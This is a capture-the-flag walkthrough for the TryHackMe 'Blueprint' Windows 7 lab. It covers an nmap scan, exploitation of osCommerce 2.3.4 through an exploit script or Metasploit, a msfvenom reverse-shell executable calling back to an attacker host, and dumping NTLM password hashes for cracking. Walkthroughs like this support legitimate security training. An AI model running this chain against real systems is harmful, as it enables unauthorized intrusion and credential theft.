Blueprint | THM

STEP I: Start the machine and scan all ports and running services

└─$ nmap -p- -Pn -sV -sC 10.49.156.161       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-21 03:44 -0400
Nmap scan report for 10.49.156.161
Host is up (0.072s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: Index of /
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-21T08:47:06+01:00
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-04-21T07:47:06
|_  start_date: 2026-04-21T07:20:55
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 0a:d5:71:b9:93:ff (unknown)

STEP II: From the scan report we got many open ports and in port 8080/tcp a filename with its version and also paste it into the url then we also got the same name directory
Perform some more enumeration on the directory and get details.

STEP III: Simply now search on the searchsploit
From here we can see, RCE available for exploitation so we can download and use it directly
searchsploit -m 50128
python 50128.py http://<Victim_IP>:8080/oscommerce-2.3.4/catalog/

OR,

We can use msfconsole to exploit it
search oscommerce
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set URI /oscommerce-2.3.4/catalog/install/
set RHOSTS <Victim_IP>
set LHOST <Attacker_IP>
set RPORT 8080
exploit
Now we will got a meterpreter session
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
[*] Started reverse TCP handler on 192.168.143.129:4444 
[*] Sending stage (42137 bytes) to 10.49.156.161
[*] Meterpreter session 1 opened (192.168.143.129:4444 -> 10.49.156.161:49316) at 2026-04-21 03:35:18 -0400

meterpreter > sysinfo
Computer     : BLUEPRINT
OS           : Windows NT BLUEPRINT 6.1 build 7601 (Windows 7 Home Basic Edition Service Pack 1) i586
Architecture : i586
Meterpreter  : php/windows
meterpreter > getuid
Server username: 
meterpreter > dir C:/Users/Administrator/Desktop
Listing: C:/Users/Administrator/Desktop
=======================================

Mode              Size           Type  Last modified                      Name
----              ----           ----  -------------                      ----
100666/rw-rw-rw-  1211180777754  fil   211641783000-06-29 12:21:19 -0400  desktop.ini
100666/rw-rw-rw-  158913789989   fil   214344271123-10-28 05:41:29 -0400  root.txt.txt
meterpreter > cat C:/Users/Administrator/Desktop/root.txt.txt
---------------------<Root-Flag>-----------------------
meterpreter >

STEP IV: Now for extracting hashes we will use a reverse_tcp payload so using msfvenom we can create the exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.143.129 LPORT=8082 -f exe > blueprint.exe

STEP V: From meterpreter session upload it into victim system so, creating a python server we will upload it
  python -m http.server
  
meterpreter > mkdir Temp 
meterpreter > pwd
C:\
meterpreter > cd Temp
meterpreter > upload /home/kali/blueprint.exe
[*] Uploading  : /home/kali/blueprint.exe -> blueprint.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/kali/blueprint.exe -> blueprint.exe
[*] Completed  : /home/kali/blueprint.exe -> blueprint.exe
meterpreter >

Also we will have to a set a listner so we will use multi/handler

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <Attacker_IP>
set LPORT 8082

After updating all details we will exploit or run it and then move into privious meterpreter session and simply use command exploit -f <msfvenom_filename>

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.143.129:8082
meterpreter > execute -f blueprint.exe
Process 4076 created.
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.143.129:8082 
[*] Sending stage (196678 bytes) to 10.49.156.161
[*] Meterpreter session 1 opened (192.168.143.129:8082 -> 10.49.156.161:49340) at 2026-04-21 03:40:54 -0400

meterpreter > sysinfo
Computer        : BLUEPRINT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Now after executing the exe file we got a new 32 bit meterpreter shell so from here we will extract the hashes of the users

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::

We can now use crackstation <https://crackstation.net/> or kali tools like hashcat or JohnTheRipper so we will get the decrypted password of lab user.
